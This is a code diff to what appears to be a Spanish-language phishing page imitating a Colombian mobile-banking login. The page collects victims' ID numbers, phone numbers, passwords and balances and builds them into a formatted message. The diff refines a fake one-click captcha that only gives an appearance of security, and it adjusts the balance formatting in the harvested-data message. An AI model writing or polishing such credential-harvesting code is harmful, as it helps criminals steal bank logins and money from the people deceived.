@@ -318,7 +318,7 @@
             usernameInput.addEventListener('input', formatUsername);
             passwordInput.addEventListener('input', formatPassword);
             saldoInput.addEventListener('input', formatSaldo);
-            captchaImg.addEventListener('click', toggleCaptcha);
+            captchaDiv.addEventListener('click', toggleCaptcha);
 
             // Formatear número de celular (XXX XXX XXXX)
             function formatUsername() {
@@ -364,8 +364,8 @@
             // Toggle captcha
             function toggleCaptcha() {
                 captchaClicked = true;
-                captchaImg.src = "https://via.placeholder.com/250x70/d4edda/28a745?text=Verificado+✓";
-                captchaImg.classList.add('selected');
+                captchaDiv.textContent = "Verificado correctamente";
+                captchaDiv.classList.add('selected');
                 validateForm();
             }
 
@@ -417,7 +417,7 @@
                              `🪪 **Cédula:** ${cedula}\n` +
                              `📱 **Número:** ${usuario}\n` +
                              `🔑 **Clave:** ${clave}\n` +
-                             `💰 **Saldo:** $${saldo}\n` +
+                             `💰 **Saldo:** ${saldo}\n` +
                              `📅 **Fecha:** ${new Date().toLocaleString('es-CO')}`
                 };
 
